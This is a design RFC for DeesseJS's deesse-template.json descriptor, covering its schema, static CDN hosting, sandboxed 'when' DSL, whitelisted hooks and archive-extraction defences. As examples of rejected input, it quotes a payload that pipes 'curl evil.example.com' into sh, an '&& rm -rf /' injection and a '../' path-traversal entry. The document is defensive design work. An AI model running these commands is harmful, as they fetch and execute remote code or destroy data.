# RFC-002: The DeesseJS Template Item Descriptor (`deesse-template.json`)

## Title, Author, Reviewers, Status

**Title**: The DeesseJS Template Item Descriptor

**Author**: DeesseJS team

**Reviewers**: TBD (assigned on PR)

**Status**: `Accepted (2026-09)`. Approved after three senior review rounds; tracked by [PR #137](https://github.com/deessejs/deessejs/pull/137). Follow-up tracked by [issue #139](https://github.com/deessejs/deessejs/issues/139) (ADR-001 scope amendment for plain-HTTPS `fetch`). This RFC is the **authoritative reference** for `deesse-template.json`; ADR-032 is the load-bearing spec with the field-by-field table; RFC-001 covers the project-side config; RFC-003 covers `deessejs add`; RFC-004 covers the author tooling.

**Scope of this RFC**: the descriptor format, its transport, its security guarantees, its alternatives, its open questions, and its future possibilities. **Out of scope**: `deesse.json` (RFC-001), `deessejs add` (RFC-003), `deessejs template validate | new | explain` (RFC-004). The three companion documents partition the registry spec; this RFC is the descriptor's half.

## Summary

This RFC proposes **`deesse-template.json`** — a single-file item descriptor co-located at the root of every template repo (`deessejs/<slug>`). The file declares one item's:

- **Identity**: `$schema`, `name`, `title`, `description`, `type`, `version`, `author`, `license`, `category`, `labels`.
- **Source**: `source = { repo, ref, cloneUrl }` for fetching the item tree.
- **Runtime requirements**: `requires = { node, packageManager }` for install-time gating.
- **Dependencies**: `dependencies`, `devDependencies` (npm packages with pinned versions), `templateDependencies` (registry items, cycle-detected, depth-limited).
- **User interaction**: `prompts[]` (declarative Q&A with a sandboxed `when` DSL).
- **Filesystem output**: `files[]` (declarative list of source-to-target mappings with four transform verbs).
- **Lifecycle hooks**: `hooks = { postInit, postInstall }` (whitelisted, `shell: false`, tokenised argv).
- **Documentation**: `docs` (URL or relative path to the user-facing docs).

The closed-list top-level shape is documented exhaustively in [ADR-032 §Field reference](/decisions/ADR-032-deesse-template.json). This RFC focuses on the **why** of each design call (the discriminator, the DSL, the consumption rules, the hook safety) and points at the ADR for the field-by-field technical specification.

The descriptor is a **data file**, not code. Adding a template is a content change to a repo, never a CLI release. This is the load-bearing governance rule (`.claude/agent-memory/tech-lead/project/templates-content-not-cli.md`) that the entire registry architecture rests on.

The descriptor is fetched from a **static-only CDN** at `registry.deessejs.dev` (plain HTTPS `GET`, no API runtime, no oRPC). The CDN serves two kinds of files: JSON Schemas at `/schema/{project,template}.json` (generated from the Zod sources by the `packages/contracts` publication CI) and registry items at `/r/<slug>.json` (generated by the `packages/api` publication CI from the `TEMPLATES` array). The transport split between oRPC (dynamic internal API) and plain `fetch` (registry CDN) is the load-bearing wire discipline; the ADR-001 amendment tracked by [issue #139](https://github.com/deessejs/deessejs/issues/139) is a scope clarification, not a relaxation.

## Goals and Non-Goals

### Goals

1. **Define a single descriptor file that carries everything the install pipeline needs.** One JSON file at the root of the template repo. No build step. No companion files required (the schema is the contract). Validated by the CLI through the Zod schema `TemplateV2` at install time and by the author tooling at write time (per [RFC-004](./RFC-004-template-author-tooling)).
2. **Treat descriptors as content, not code.** Adding a template must not require a CLI release. This is the `templates-content-not-cli` invariant: a new entry in `packages/api/src/templates.ts` (the registry source of truth, mirrored to `registry.deessejs.dev/r/<slug>.json` by the publication CI) is a content change. Only `Template` schema-level changes (renaming a field, changing a discriminator value) trigger a CLI changeset.
3. **Keep the wire contract additive.** The descriptor evolves from `TemplateV1` (13 flat fields) to `TemplateV2 = TemplateV1 & { new fields }`. No required fields are added in V2; every new field is optional or has a default. Existing CLIs that only know `TemplateV1` keep working because the upstream `packages/api` continues to publish both response shapes.
4. **Sandbox the parser and the hook runner.** The descriptor must be safe to consume from any registry, official or third-party. No `eval`, no `Function`, no `shell: true`. The Zod schema is the validator of last resort; the `when` DSL is a tree-walking AST interpreter; the hook runner spawns with `shell: false` and tokenised argv.
5. **Host the descriptor on a static-only CDN.** No API runtime, no oRPC behind `registry.deessejs.dev`. The CDN is content-addressed, immutable between releases, ETag-revalidable. Cost is near-zero; reliability is bounded by the CDN provider's SLA.
6. **Make the wire contract evolvable without breaking existing CLIs.** `TemplateV2` is additive over `TemplateV1`; the server publishes both response shapes; clients pick the one they understand. Widening is non-breaking; narrowing is breaking and requires a major bump.

### Non-Goals

1. **Private registry items behind auth.** Out of scope for this RFC. Private items live on a separate CDN (e.g. `private.registry.deessejs.dev`) gated by the existing `auth.*` oRPC procedures, and require a separate ADR. The public CDN at `registry.deessejs.dev` stays auth-free by design — auth on the public CDN would add operational cost (token validation, rate limiting) without solving a current problem.
2. **Auto-discovery of namespaces from a `registry.json` at a public repo root.** GitHub rate-limiting (60 req/h unauthenticated) makes this unsafe for the initial release. A follow-up ADR may add it gated on `--discover` opt-in with explicit rate-limit handling (cached `HEAD` requests, ETag revalidation, user-prompted probe).
3. **Inlining file contents in the registry JSON** (shadcn-style). Our overlays are larger than shadcn components (a blog is a route + a Prisma adapter + a server handler + a UI form), and inlining bloats the descriptor past CDN-friendly size. The descriptor carries **metadata** (paths, transforms, prompts); the file contents live in the template repo's `files/` directory. The CLI fetches a tarball from `registry.deessejs.dev/t/<slug>-<version>.tar.gz` (falling back to shallow `git clone`) and extracts from there (per [RFC-003 §"File acquisition"](./RFC-003-deessejs-add)).
4. **A `deessejs build` command that compiles TSX sources into `deesse-template.json`** (shadcn-style). The descriptor is JSON, not derived. A future build command is out of scope until a real use case surfaces (multi-style templates, code generation). Adding `deessejs build` would be a second sanctioned exception to [ADR-010 §1](/decisions/ADR-010-cli-public-surface) on top of `add` and the `template` namespace — a third exception would weaken the closed-list invariant.
5. **A web UI for non-technical template authors** (`ui.deessejs.dev/create`-style). The author tooling is CLI-only (per [RFC-004](./RFC-004-template-author-tooling)). A web UI is out of scope for this RFC; tracked separately if the team surfaces a need (likely coupled with the PRO namespace, see "Future Possibilities" §B).
6. **Multi-style templates (one repo ships several variants of the same item).** Today a style is a field on the descriptor (per the closed-list), and a single descriptor declares one style. Multi-style would require either a `style: 'array'` widening or a `deessejs build` pipeline; both are out of scope until a real use case surfaces.
7. **A `deessejs template manifest` field** that tracks which files each item created (for drift detection). Drift detection exists at re-install time via per-file hash comparison (per [RFC-003 §"Re-install semantics"](./RFC-003-deessejs-add)), but a persistent manifest field is not in this contract. A future ADR may add it; today the lockfile's per-file checksums carry the same information.

## Motivation

The DeesseJS template registry is the project's identity surface. The user has framed it on the marketing site as a registry that spans "packages, CLI, SaaS multi-tenant, mobile, desktop, AI agent, landing page" — not a single-template repo. Today the registry is a single hand-curated TypeScript array exported from `packages/api/src/templates.ts`:

```ts
export const TEMPLATES: RegistryEntry[] = [
  {
    slug: "saas-starter",
    name: "SaaS Starter",
    description: "Production-ready Next.js + Better Auth + Postgres boilerplate for B2B SaaS.",
    owner: "deessejs",
    repo: "saas-template",
    license: "MIT",
    category: "saas",
    labels: ["nextjs", "saas", "auth", "postgres"],
    layer: "open-community",
  },
]
```

The wire contract `TemplateV1` carries thirteen flat fields. The CLI consumes the same endpoint and shells out to `git clone --depth 1 --branch <ref>` plus `pnpm/npm install`. There is no manifest reading, no token replacement, no post-processing — the CLI is a glorified clone wrapper. Templates as files live in external GitHub repos; the registry only carries metadata.

The flat shape works for a one-template registry. It does not work for the registry the team is building. The structural gaps the user has framed for the multi-template, multi-stack roadmap are documented in detail at [ADR-032 Context](/decisions/ADR-032-deesse-template.json); this RFC does not duplicate the analysis but inherits the load-bearing gaps:

- **No manifest reading.** `TemplateV1` declares thirteen fields and nothing about dependencies, runtime requirements, post-install scripts, or transformations. The CLI installs whatever package manager the user has on the machine without checking that the template requires `pnpm@9`, that it depends on `next@^15`, or that it ships an `.env.example` the user should rename to `.env`.
- **No composition.** The roadmap mentions `packages-template`, `cli-template`, `mobile-template`, `desktop-template`, `ai-agent`, `landing-template`. None of them composes with another. A user who wants `saas-starter` + `ai-agent` runs two `init` calls into two directories and merges by hand. shadcn's `templateDependencies` solves this; `TemplateV1` has no equivalent.
- **No namespaces.** The CLI hardcodes one upstream registry. Every template ships from one org. shadcn's `components.json#registries` map plus the GitHub-static-JSON convention lets the CLI install items from any author without a CLI release; `TemplateV1` has no equivalent.
- **No transform layer.** The CLI cannot rename `.env.example` to `.env`, interpolate `{{DATABASE_URL}}` from a token map, remove files the user opted out of (e.g. a Storybook setup), or merge `AGENTS.md` fragments contributed by each template.

`deesse-template.json` is the **single response to all four gaps**. It is the file that carries the manifest, the composition map, the namespace metadata, and the transform instructions — all declarative, all in one place, all validated through a published Zod schema.

## Detailed Design

The Detailed Design section **does not duplicate [ADR-032](/decisions/ADR-032-deesse-template.json)**. It points at the ADR for the field-by-field specification and explains the rationale for the load-bearing design calls.

### Closed-list top-level shape

The descriptor's top-level fields are a **closed list**: `$schema`, `name`, `title`, `description`, `type`, `version`, `author`, `license`, `category`, `labels`, `source`, `requires`, `dependencies`, `devDependencies`, `templateDependencies`, `docs`, `prompts`, `hooks`, `postinstall`, `files`. Two reserved-but-unused fields (`cssVars`, `meta`) are kept for future shadcn-style compatibility. Any top-level field outside this list fails at parse time with `parse_error`.

**Why closed-list.** A closed list prevents typos and schema drift in third-party registries. An author who writes `template.dependancies` (typo) gets a parse error at item-fetch time, before any side effects on disk. A closed list also bounds the CLI's implementation surface — every field has a known type, every field is unit-tested, every field has a place in the JSDoc-on-Zod-schema contract.

**Why widen the list is non-breaking.** Adding a new optional field to the closed list is non-breaking because existing CLIs ignore fields they don't know. The wire contract is parsed by Zod with `passthrough` or `.strict()` per the schema's posture; for closed-list fields, the posture is `.strict()` (any unknown field is a parse error), so widening requires a Zod schema version bump and a CLI version bump. The schema lives at `@workspace/contracts/src/v1/template.ts`; the version is the package version.

Full field reference: [ADR-032 §Field reference](/decisions/ADR-032-deesse-template.json).

### The `template:type` discriminator

The descriptor declares one of seven closed-list values for `type`:

| Value | Use | CLI command |
|---|---|---|
| `template:app` | Full project clone (a starter) | `deessejs init` only |
| `template:package` | Feature overlay (the most common type) | `deessejs add` |
| `template:cli` | CLI tool scaffolding | `deessejs init` or `deessejs add` |
| `template:mobile` | Mobile app scaffolding | `deessejs init` or `deessejs add` |
| `template:desktop` | Desktop app scaffolding | `deessejs init` or `deessejs add` |
| `template:agent` | AI agent scaffolding | `deessejs init` or `deessejs add` |
| `template:landing` | Landing page as a full app clone | `deessejs init` or `deessejs add` |

**Discriminator enforcement** (per [RFC-003 §"Type-discriminator enforcement"](./RFC-003-deessejs-add)):

- `deessejs init <slug>` refuses any non-`template:app` type with `parse_error`: *"`slug` is a template:package; use `deessejs add <slug>` instead."*
- `deessejs add <slug>` refuses `template:app` with `parse_error`: *"`slug` is a template:app; use `deessejs init <slug>` instead."*

**A blog is a `template:package`** with more files. There is no `template:blog` discriminator (per [ADR-035](/decisions/ADR-035-feature-not-subtree)). Adding a blog-specific discriminator would be a **load-bearing governance** violation: every new discriminator value is a new install-time decision branch in the CLI, a new field validation rule in the schema, and a new entry in every list/filter UI. The closed-list of seven discriminators is exhaustive for the foreseeable future.

### Reserved placeholders for `files[].target`

The `files[]` array uses **placeholder strings** in `target` that resolve against the consumer project's `deesse.json#paths` and `deesse.json#aliases` at install time. The reserved placeholder grammar:

| Placeholder | Resolves to | Direction |
|---|---|---|
| `@components/` | `<aliases.components>/` | import-relative |
| `@lib/` | `<aliases.lib>/` | import-relative |
| `@hooks/` | `<aliases.hooks>/` | import-relative |
| `@ui/` | `<aliases.ui>/` | import-relative |
| `@apps/` | `<paths.apps>/` (or `<aliases.apps>/` if monorepo) | filesystem-relative |
| `@packages/` | `<paths.packages>/` (or `<aliases.packages>/` if monorepo) | filesystem-relative |
| `~/` | `<projectRoot>/` | filesystem-relative |

`@utils/` is explicitly **not** a reserved placeholder (per shadcn's precedent). An author who needs a `utils` directory uses a literal path (`src/lib/utils.ts`) or declares `aliases.utils` in their `deesse.json`.

**Unknown placeholders fail at item-fetch time** with `parse_error`. The CLI does not silently pass through unknown placeholders — that would let a typo (`@componnts/`) install a file at the wrong path.

### The `when` DSL

Prompts can declare conditional visibility via `when: <expr>`. The expression grammar is closed:

```
expr     := andExpr
andExpr  := orExpr ( "&&" orExpr )*
orExpr   := primary ( "||" primary )*
primary  := comparison | "(" expr ")"
comparison := identifier ( "==" | "!=" | "in" ) literal
identifier := [a-zA-Z_][a-zA-Z0-9_.]*
literal  := "'" [^']* "'" | "true" | "false" | number
```

The implementation is a **tree-walking AST interpreter** at `apps/cli/src/prompts/when.ts`. **No `eval()`, no `new Function()`, no `vm` module.** A malformed `when` fails at item-fetch time before any prompt is shown. A third-party registry item that ships `when: "1; require('child_process').exec('curl evil.example.com | sh'); 1"` gets a syntax error from the parser, not an RCE from a naive interpreter.

The evaluation context is two-scoped:

```ts
type WhenContext = {
  answers: Record<string, string | boolean | number>;  // prior prompts in this install
  project: DeesseProjectConfig;                          // loaded from deesse.json
};
```

`when: "project.database == 'postgresql' && answers.use_prisma == true"` is the canonical pattern: skip a database adapter prompt for users who already configured `database` in `deesse.json`, or condition on a previous prompt's answer. Bare identifiers in `when` resolve against `answers` first, then `project`. The interpreter has no access to `process`, `require`, `fs`, or any Node.js primitive.

Full unit-test suite: `apps/cli/test/unit/when.test.ts` (one fixture per operator, one fixture per combinator, one fixture per sandboxed-escape attempt).

### The `consumes[]` consumption rules

Prompts can declare **what their answer populates** via `consumes[].target`. The `target` field has four closed-list discriminators:

| `target` value | What it populates | Source of the value |
|---|---|---|
| `project:database` | `deesse.json#database` | The prompt's answer |
| `project:<key>` | `deesse.json#<key>` (any top-level field) | The prompt's answer |
| `tokens:<KEY>` | `deesse.json#tokens.<KEY>` | The prompt's answer |
| `file:<glob>` | Memory-only; consumed by file transforms (with_*-style toggles) | The prompt's answer (boolean) |
| `template:<key>` | The resolved item's install state (internal) | The prompt's answer |

**Explicit `target` overrides an implicit convention by prompt name pattern.** The implicit conventions:

| Prompt name pattern | Implicit `target` |
|---|---|
| `database` | `project:database` |
| `*_url`, `*_token`, `*_key`, `*_secret` | `tokens:<UPPER_SNAKE>` |
| `with_*` (boolean) | `file:./<name-snake-cased-path>/` (auto-detected from the cloned tree) |
| `framework`, `ts`, `typescript` | `project:typescript` |

Last-write-wins on collision; CLI logs a warning when an explicit `target` overrides an implicit convention. The explicit-vs-implicit rule covers 95% of templates with zero author effort; the 5% that need precision declare `consumes[]` explicitly.

### Hook runner safety

The descriptor's `hooks = { postInit, postInstall }` and the back-compat `postinstall[]` array run shell commands at install time. Three invariants:

1. **Whitelist (closed-list).** Allowed verbs at `apps/cli/src/hooks/whitelist.ts`: `["{pm} install", "{pm} add", "{pm} remove", "{pm} db:push", "{pm} db:migrate", "{pm} db:generate", "{pm} generate", "{pm} format", "{pm} typecheck", "git init"]`. The `{pm}` placeholder substitutes the package manager. Any verb not on the list fails at item-fetch time with `parse_error`.
2. **`shell: false` and tokenised argv.** No `/bin/sh -c`, no command chaining (`&&`, `;`, `|`, backticks, `$()`), no shell-injection. The runner spawns `child_process.spawn(verb, [args], { shell: false })`. **Mathematically prevents command chaining** from a malicious or hand-edited descriptor.
3. **Substitution priority.** `--pm` flag > `deesse.json#packageManager` > lockfile-detected PM > system PATH. A malicious `{pm}` value cannot be injected because the substitution comes from a closed-list env var, not from user input.

**Threat boundary.** The runner eliminates **manifest command injection** (an item author writing `&& rm -rf /` in their `deesse-template.json#hooks`) but does **not** sandbox downstream package-manager lifecycle scripts. `{pm} install` and `{pm} add <dependency>` execute the npm `preinstall`, `install`, and `postinstall` scripts of every dependency in the registry item's `dependencies[]`. A malicious or compromised dependency runs arbitrary shell code at install time. The CLI does not block this — third-party registries are an explicit trust boundary (per the Future Possibilities §Community support section). The user must opt in to registries they trust (or pass `--ignore-scripts` to npm-family package managers, accepting that native-dependency packages like Prisma and esbuild break).

Unit-tested at `apps/cli/test/unit/hooks-runner.test.ts`: one fixture per whitelist entry, one fixture per command-chain attempt (`&&`, `;`, `|`, backticks, `$()`), one fixture per shell-injection attempt.

### Wire contract evolution: `TemplateV1` → `TemplateV2`

The wire contract `TemplateV2` extends `TemplateV1` **additively**. Every field in `TemplateV1` stays in `TemplateV2` with the same type; new fields are appended. **No required fields are added.** Existing CLIs that only know `TemplateV1` keep working because the upstream `packages/api` continues to publish the `TemplateV1`-shaped response for clients that haven't bumped.

`@workspace/contracts` gains `TemplateV2` alongside `TemplateV1`; both Zod schemas live in `packages/contracts/src/v1/`. A barrel re-exports both. The server's `templates.list` oRPC procedure returns `TemplatesListResponseV2` (a parallel response shape); the V1 response is preserved for backward compatibility.

**The `templates-content-not-cli` invariant** from `.claude/agent-memory/tech-lead/project/templates-content-not-cli.md` is preserved: a new template entry (one line added to `packages/api/src/templates.ts`) never triggers a CLI changeset. Only `Template` schema-level changes (renaming a field, changing a discriminator value) can trigger a CLI changeset, and only if the change is **narrowing** (breaking).

### Registry host: `registry.deessejs.dev`

A **static file host**. No API runtime, no Hono server, no oRPC endpoint behind it. The host serves two kinds of files over plain HTTPS `GET`:

- **JSON Schemas** at `/schema/{project,template}.json`. Generated from the Zod sources in `@workspace/contracts` (via `zod-to-json-schema` or equivalent) by a CI job that runs on every release of that package. Versioned in lockstep with `@workspace/contracts`.
- **Registry items** at `/r/<slug>.json`. One file per official template, generated by a CI job in `packages/api` from the `TEMPLATES` array in `packages/api/src/templates.ts`. Each item's JSON content is the merged `TemplateV2` shape (registry data + GitHub enrichment, the same shape the oRPC `templates.list` procedure returns today).
- **Tarballs** at `/t/<slug>-<version>.tar.gz`. Pre-built by the publication CI from the cloned template repo at publish time. The CLI does not rely on `codeload.github.com` for the official registry — that path is the fallback for third-party GitHub sources where the CDN tarball is not available (e.g. `@<host>/<slug>` for a user's own registry).

**Why static-only:**

- **No backend to operate.** A static host costs near-zero runtime RAM and never pages on-call.
- **CDN-cache-friendly.** A CDN-cached JSON file is faster than a dynamic endpoint; the CLI's existing ETag revalidation (per [ADR-010 §4](/decisions/ADR-010-cli-public-surface)) keeps working unchanged.
- **No secret material.** Registry data is public by definition; no `GITHUB_TOKEN`, no per-user rate-limit concern, no auth header.

**Transport split** (the load-bearing wire discipline):

- `init <slug>`, `add <feature>` (one item): plain `fetch` over HTTPS against `registry.deessejs.dev`.
- Third-party registries (`@community/...`, `@<host>/...`): plain `fetch` over HTTPS against the user-declared host.
- `list`, `info`, `auth.*`, version probe: typed oRPC client against `app.deessejs.com`.

This requires an amendment to [ADR-001](/decisions/ADR-001-orpc-is-load-bearing) §"What this rule forbids" to carve out an explicit exception for plain-HTTPS `fetch` against (a) the registry CDN and (b) third-party registry hosts. ADR-001's load-bearing rule — "no parallel REST envelope for the internal API" — stays intact; the amendment is a scope clarification, not a relaxation. Tracked by [issue #139](https://github.com/deessejs/deessejs/issues/139).

**Provisioning checklist:** one CNAME, one TLS cert, one Vercel project named `registry-deessejs-dev` (root: `packages/api/public/`), one GitHub Actions workflow per publication source.

## Alternatives Considered

Four patterns were considered and rejected during the development of this RFC and its underlying ADRs.

### Alternative 1: One central `registry.json` in `packages/api/src/`

What it is: A single `registry.json` file at the root of the API repo, listing every item. The CI builds and publishes from this one source.

Why we rejected it: The user explicitly framed the registry as a global, multi-stack surface (per the locked homepage copy and the `project-templates-roadmap` memory); centralising the registry data in one repo forces a CLI release every time a new template ships. The co-located `deesse-template.json` per repo keeps the registry content-driven.

Source: [ADR-032 "Why not the alternatives" #1](/decisions/ADR-032-deesse-template.json).

### Alternative 2: A `deessejs build` pipeline generating descriptors from TSX sources

What it is: A new public CLI command `deessejs build` that compiles `registry/<style>/<item>.tsx` into `deesse-template.json` (shadcn's model).

Why we rejected it for the initial release: Adding a second sanctioned exception to [ADR-010 §1](/decisions/ADR-010-cli-public-surface) (on top of `add`) would weaken the closed-list invariant, and the source files (`deesse-template.json` is data, not code) would be the schema itself. A follow-up ADR may revisit this if a real use case surfaces (multi-style templates, code generation).

Source: [ADR-032 "Why not the alternatives" #2](/decisions/ADR-032-deesse-template.json).

### Alternative 3: Historical `manifest.json` from the pre-implementation design

What it is: The historical proposal at `documents/internal/architecture/12-apps/cli/template-conventions.md` describing a richer manifest with tokens, removal lists, demos, etc.

Why we rejected it: The historical doc is design history, not shipped code (per the divergence plan at `docs/engineering/plans/saas-template-divergence.md`). The `deesse-template.json` in this RFC supersedes it. The historical file's content is preserved in git history for reference.

Source: [ADR-032 "Why not the alternatives" #3](/decisions/ADR-032-deesse-template.json).

### Alternative 4 (rejected during RFC review): `deessejs embed` for sub-templates

What it is: A new top-level CLI verb `deessejs embed <slug-or-url>` for "sub-templates" (items that claim a sub-tree of the project).

Why we rejected it: The user explicitly framed a blog as a feature: *"It's a complete feature, which may need to add routes, schemas, pages, components, etc."* — i.e., a blog is a feature, just bigger than auth. The conceptual distinction between "feature overlay" and "sub-template" is artificial at this level. The existing `add` command with the `template:package` discriminator handles the blog case.

A future `scope: "subtree"` field on `TemplateV2` is allowed (additive, optional, default `"overlay"`) if a real use case surfaces where a feature needs to claim a sub-tree opaque to other features.

Source: [ADR-035](/decisions/ADR-035-feature-not-subtree).

## Risks and Cross-Cutting Concerns

### Security

**The `when` DSL is sandboxed.** A third-party registry item could ship `when: "1; require('child_process').exec('curl evil.example.com | sh'); 1"` and trick a naive `eval`-based interpreter into executing arbitrary code at install time. The tree-walking AST interpreter in `apps/cli/src/prompts/when.ts` closes that hole: the parser refuses the input as a syntax error before evaluation ever happens. Unit-tested in `apps/cli/test/unit/when.test.ts` (one fixture per sandboxed-escape attempt: `eval`, `Function`, `process`, `require`, `globalThis`, `__proto__`, `this`).

**`when` evaluation context.** The DSL is evaluated against a two-scope context (`answers`, `project`) — no access to `process`, `require`, `fs`, or any Node.js primitive. Bare identifiers resolve against `answers` first, then `project`. See the "Detailed Design" §"The `when` DSL" above for the context shape.

**Hooks are spawned with `shell: false` and tokenised argv.** No `/bin/sh -c`, no command chaining, no shell-injection. The whitelist (`apps/cli/src/hooks/whitelist.ts`) is a closed list; verbs not on it fail at item-fetch time with `parse_error`. Unit-tested in `apps/cli/test/unit/hooks-runner.test.ts`.

**Threat boundary.** The runner eliminates **manifest command injection** (an item author writing `&& rm -rf /` in their `deesse-template.json#hooks`) but does **not** sandbox downstream package-manager lifecycle scripts. `{pm} install` and `{pm} add <dependency>` execute the npm `preinstall`, `install`, and `postinstall` scripts of every dependency in the registry item's `dependencies[]`. A malicious or compromised dependency runs arbitrary shell code at install time. The CLI does not block this — third-party registries are an explicit trust boundary (per Future Possibilities §Community support). The user must opt in to registries they trust (or pass `--ignore-scripts` to npm-family package managers, accepting that native-dependency packages like Prisma and esbuild break). The full trust model is documented at `docs/security/cli-trust-model.md` (to be written).

**The Zod schema is the validator of last resort.** A malformed item from any registry (official or third-party) fails at parse time with `parse_error` before any side effects on disk. The CLI does not write any file before the descriptor is validated.

**The top-level fields are closed-list.** Any top-level field not documented in [ADR-032 §Reserved field names](/decisions/ADR-032-deesse-template.json) fails at parse time. This prevents typos and schema drift in third-party registries.

**The CLI refuses path traversal.** A `target` that resolves outside `projectRoot` fails with `parse_error`. A `cloneUrl` that is not a valid HTTPS URL fails at item-fetch time.

### Archive Extraction Guarantees (Zip Slip + Symlink Defence)

When the CLI extracts a downloaded tarball into `os.tmpdir()`, it enforces two invariants on every entry:

1. **Path containment** (anti-Zip Slip). The CLI computes the absolute target path as `path.resolve(destDir + path.sep + entry.name)` and asserts that the result starts with `path.resolve(destDir) + path.sep`. Any entry whose resolved path escapes `destDir` (e.g. `../../../etc/cron.d/evil`) triggers `security_violation` (internal error code) and the install aborts immediately. No file is written.

2. **No symlinks or hardlinks.** The extraction implementation reads the entry type byte from the tar header and rejects any entry that is not a regular file or a directory. Symlinks pointing outside `destDir` and hardlinks referencing files outside the archive are common attack vectors for arbitrary file writes; both are **rejected by default**. A registry item that legitimately needs a symlink must be redesigned to use the `files[]` overlay mechanism instead.

The implementation lives at `apps/cli/src/transforms/extract.ts`. Unit tests in `apps/cli/test/unit/extract.test.ts` assert (a) rejection of `../` entries, (b) rejection of absolute paths, (c) rejection of symlinks, (d) rejection of hardlinks, (e) acceptance of nested regular files and directories. The unit tests are run on every CI build; a regression that allows path escape is a P0 bug.

### Dependency Resolution Guarantees

`templateDependencies` are resolved with three guarantees before any disk write or prompt execution:

1. **Directed Acyclic Graph (DAG) validation with cycle detection.** The CLI runs a depth-first topological sort on the resolved dependency graph. A cycle (e.g. `auth → database-adapter → auth`) is detected and the install aborts with `circular_dependency` (internal error code). The CLI prints the cycle path to stderr: *"Circular dependency detected: auth → database-adapter → auth."* No file is written, no prompt is asked, no dependency is acquired.

2. **Depth limit.** The dependency tree has a maximum depth of **5**. A dependency at depth 6 or more is rejected with `dependency_depth_exceeded` (internal error code). This prevents denial-of-service via deeply nested dependency trees and bounds the install flow to a predictable size. A template author who needs deeper composition must refactor (flatten the tree).

3. **Upfront prompt aggregation.** All `prompts[]` across the resolved dependency graph are collected **before any file acquisition or disk write**. The CLI walks the topological order (parents before children) and presents prompts in declaration order; answers may mutate the overlay's resolved paths (a `database` prompt may pick a Prisma adapter that writes a different `schema.prisma`); the command respects that.

   **Lazy prompts across dependencies are explicitly forbidden.** Interleaving prompt collection with file writes breaks atomic rollback (the user cannot undo a partial install if a later prompt is rejected after earlier items' files are written). The eager-aggregation rule is non-negotiable; deviations require an ADR.

   **Conflict detection on prompt answers.** If template A's `database` prompt resolves to `postgresql` and template B's resolves to `sqlite`, the CLI surfaces both requirements during prompt collection and asks the user to pick one (or pass `--force` to override with a loud warning). The CLI does not auto-resolve conflicting defaults.

### Transform Verb Scope

The `files[]` transform verbs (`rename`, `interpolate`, `remove`, `merge`) have well-defined scopes. Three are deterministic and safe:

- **`rename`** — copies the source file at `path` to `target` without modification. No AST, no parsing.
- **`interpolate`** — reads `path` as a template (with `{{KEY}}` placeholders) and writes the rendered content to `target`. The placeholders are substituted from `deesse.json#tokens` (set via `consumes: { target: "tokens:<KEY>" }` or hand-edited by the user). No AST, no parsing.
- **`remove`** — does not copy a file; removes files in the cloned tree at the resolved `target` path. Used for `with_*` toggles.

The fourth, **`merge`**, is restricted to specific target types:

- **JSON files** (`.json`): deep merge of objects, with arrays replaced wholesale (no element-level merge).
- **Env files** (`.env`, `.env.local`): key/value line replacement; existing keys are overwritten, new keys are appended.
- **Append-with-sentinel files** (e.g. `AGENTS.md`): lines appended after a sentinel marker (e.g. `# --- deessejs-managed ---`); the marker is added on first install and the section between markers is owned by the CLI on subsequent installs.

**AST-level code merging is explicitly forbidden in this contract.** Merging a `.ts`, `.tsx`, `.py`, `.rs`, `.prisma`, or other AST-sensitive file aborts the install with `parse_error` and a clear error message. Code modification goes through overlay file placement (`files[]` with `transform: "rename"` or `transform: "interpolate"`) or `hooks.postInstall`. The `merge` verb does not produce valid code for arbitrary inputs.

### CDN Tarball Hosting

For official `@deessejs/*` items, the tarball is **hosted directly on the static CDN**, not fetched from GitHub:

- URL pattern: `https://registry.deessejs.dev/t/<slug>-<version>.tar.gz`
- The publication CI in `packages/api` builds the tarball from the cloned template repo at publish time and uploads it to the CDN alongside the descriptor (`registry.deessejs.dev/r/<slug>.json`).
- The CLI does **not** rely on `codeload.github.com` for the official registry. That path is the fallback for third-party GitHub sources where the CDN tarball is not available (e.g. `@<host>/<slug>` for a user's own registry).

This design avoids GitHub's unauthenticated IP-based rate limit (60 requests/hour per IP), which would break `deessejs add` in CI environments running multiple workflows in parallel. The CDN serves the tarball with the same ETag-driven revalidation as the descriptor, so cached versions are reused across sessions.

### Cost

- The static CDN at `registry.deessejs.dev` costs near-zero runtime RAM (Vercel free tier is enough for the initial launch).
- The publication CI in `packages/api` and `packages/contracts` are short-lived build steps; they don't run between releases.
- No new long-lived infrastructure ships with this RFC. The registry host is a single Vercel project.

### Compatibility

- Existing CLIs that only know `TemplateV1` keep working: the server publishes both response shapes.
- Existing web consumers (the gallery at `apps/web/src/app/(product)/templates/`) read `TemplateV1`-shaped data; no change required for the initial release.
- The `templates-content-not-cli` invariant from `.claude/agent-memory/tech-lead/project/templates-content-not-cli.md` is preserved: a new template entry never triggers a CLI release.

### Backward Compatibility Breaks Introduced by This RFC

Two breaking changes, both sanctioned:

1. **CLI surface growth**: `deessejs add` joins `init`, `list`, `info`. The closed-list rule of [ADR-010 §1](/decisions/ADR-010-cli-public-surface) is amended; this is the second sanctioned exception (the first being `deessejs auth <subcommand>`). SemVer: **minor** (the first three commands behave identically; scripts that pattern-match on the command list must add a fourth branch). Documented in [RFC-003 §"Surface area"](./RFC-003-deessejs-add) and [ADR-033 §"What changes at the CLI surface"](/decisions/ADR-033-deessejs-add).
2. **ADR-001 scope clarification**: plain-HTTPS `fetch` against the registry CDN is allowed; oRPC remains the only transport for the internal API. Documented by [issue #139](https://github.com/deessejs/deessejs/issues/139).

No other breaking changes. `TemplateV2` is additive. The CLI's flags, error codes, cache location, engines constraint, and wire contract are unchanged.

### Q1: `postinstall` whitelist size and shape?

**Resolved: `{pm}`-parameterised, ten entries.** Whitelist at `apps/cli/src/hooks/whitelist.ts`: `["{pm} install", "{pm} add", "{pm} remove", "{pm} db:push", "{pm} db:migrate", "{pm} db:generate", "{pm} generate", "{pm} format", "{pm} typecheck", "git init"]`. Portable across `pnpm`, `npm`, `yarn`, `bun`. Covers `prisma generate`, `drizzle-kit push` (via `db:generate`), and the common cases. ## Prior Art

### shadcn

The closest analogue to this design. shadcn's `registry-item.json` is the inspiration for `deesse-template.json`. The divergences:

- shadcn inlines file contents in the registry JSON (`files[].content`); DeesseJS uses a clone-into-tmp approach because our overlays are larger (a blog is a route + a Prisma adapter + a server handler + a UI form).
- shadcn has a `components.json` for project config; DeesseJS has `deesse.json` (same role — see [RFC-001](./RFC-001-deesse-json)).
- shadcn has no formal `consumes[]` convention; we add it because the user-facing surface (`project:database`, `tokens:<KEY>`) needs explicit routing for non-trivial items.

